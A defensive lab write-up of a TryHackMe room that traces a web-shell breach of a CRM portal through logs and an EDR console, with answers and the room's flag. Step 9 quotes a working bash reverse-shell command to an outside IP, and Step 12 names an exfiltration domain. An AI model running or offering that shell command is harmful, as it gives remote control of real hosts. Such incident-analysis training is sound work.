# Portal Drop

- **Room:** Portal Drop
- **Module:** [First Shift](https://tryhackme.com/module/first-shift)
- **Category:** Log Analysis / EDR
- **Difficulty:** Easy
- **Date completed:** 16.09.2026

## Summary

The WAF flags a web scan on TryPatchMe's public CRM portal (crm.trypatchme.thm), followed by a suspicious file upload. The task is to figure out, using web access logs and an EDR console, whether this is a false positive or an actual breach - and if it's real, trace what the attacker did: brute force, web shell upload, command execution, a reverse shell, and data exfiltration.

## Walkthrough

### Step 1: What is the IP address that initiated the brute force on the CRM web portal?

The provided log file was one large block of raw text, so I loaded it into Excel to make it readable:

- Data tab -> Get Data -> From File -> From Text/CSV
- Choose the log file and click Import
- In the preview window, click Transform Data instead of Load
- Use Split Column (by delimiter - space, comma, or colon) to separate timestamps, IP addresses, and error codes into clean columns
- Click Close & Load to send the final table into the sheet

Sorting IPs by frequency didn't help, since this CRM has a lot of legitimate high-volume traffic (invoice uploads). Instead I filtered by user-agent. Most were normal browsers, but `python-requests/2.31.0` stood out. Filtering to just that user-agent left only 6 rows, 2 of which had unusually long requests - a sign of base64-encoded command injection.

[insert screenshot placeholder]

**Answer:** `34.67.91.83`

### Step 2: How many successful and failed logins are seen in the logs?

Filtered the logs to POST requests on `/login.php`, then sorted by status code. `200` = successful login, `401` = failed login.

[insert screenshot placeholder]

**Answer:** `18, 35` (18 successful, 35 failed - TryHackMe wants this exact comma-separated format)

### Step 3: Following the brute force, which user-agent was used for the file upload?

Already found while answering Step 1.

**Answer:** `python-requests/2.31.0`

### Step 4: What was the name of the suspicious file uploaded by the attacker?

Also visible in the Step 1 results.

**Answer:** `invoice.php`

### Step 5: At what time did the attacker first invoke the uploaded script?

Also visible in the Step 1 results.

**Answer:** `2025-11-06 14:27:34`

### Step 6: What is the first decoded command the attacker ran on the CRM?

The command included a base64 string, so I used CyberChef to decode it - just Base64 (From Base64) twice in the recipe, with the first executed command's string (`ZDJodllXMXA`) as input.

[insert screenshot placeholder]

**Answer:** `whoami`

### Step 7: Based on the attacker's activity on the CRM, which MITRE ATT&CK Persistence sub-technique ID is most applicable?

The room description mentions a web scan and a suspicious file upload, which points toward a web-related sub-technique. Searching (Ctrl+F) for "Web" in the MITRE ATT&CK matrix leads to Web Shell.

[insert screenshot placeholder]

**Answer:** `T1505.003`

### Step 8: Which process image executes attacker commands received from the web?

This one requires the EDR console rather than the logs.

[insert screenshot placeholder]

Open the detection **Suspicious File Write: Backdoor:PHP/Generic**, then go to the IOC/Indicators tab.

[insert screenshot placeholder]

**Answer:** `/usr/sbin/php-fpm7.4`

### Step 9: What command allowed the attacker to open a bash reverse shell?

This could also be pulled from the logs (it's the other base64 string from Step 1), but it's easier to find directly in the EDR. Open the detection **Parent-Child Anomaly: Shell Spawn**, then check the IOC/Indicators tab.

[insert screenshot placeholder]

**Answer:** `bash -c "bash -i >& /dev/tcp/115.58.148.86/8080 0>&1"`

### Step 10: Which Linux user executes the entered malicious commands?

Back in **Suspicious File Write: Backdoor:PHP/Generic**, under the Summary tab.

[insert screenshot placeholder]

**Answer:** `www-data`

### Step 11: What sensitive CRM configuration file did the attacker access?

Took a bit of digging around the EDR. Found under the **System Discovery** detection -> Process Info -> click on `cat` in the process chain -> Sensitive File Read.

[insert screenshot placeholder]

**Answer:** `/etc/trycrm/config.json`

### Step 12: Which domain was used to exfiltrate the CRM portal database?

Same **System Discovery** detection, Process Info tab - this time behind the `curl` process in the process chain.

**Answer:** `portaldrop2025.xyz`

### Step 13: After responding to all detections, what flag do you obtain?

For each detection, go to the Actions/Response tab and pick the 3 correct response actions. Reviewing each detection's other tabs first (Summary, IOC/Indicators, Process Info) makes it easy to pick the right responses. No penalty for a wrong pick either, just a 30 second delay before trying again.

[insert screenshot placeholder]
[insert screenshot placeholder]
[insert screenshot placeholder]
[insert screenshot placeholder]

**Answer:** `THM{p0rtal_dropp3d?}`

And voila, there you have it!


## Lessons Learned

Excel's Power Query editor is a solid way to turn a messy raw log file into a clean, filterable table - splitting columns by delimiter makes it possible to sort and filter by IP, status code, or user-agent instead of scrolling through plain text. Pivoting on user-agent rather than just IP frequency was the key move here, since a busy CRM naturally has a lot of repeat traffic from legitimate sources - that is if you dont have access to Bash.

On the EDR side, the answers weren't all sitting in one obvious place. Moving between the Summary, IOC/Indicators, and Process Info tabs of each detection, and following the process chain (e.g. clicking into `cat` or `curl`), was necessary to piece together the full attack chain. CyberChef also earns its place here again for quickly decoding base64 commands without doing it by hand.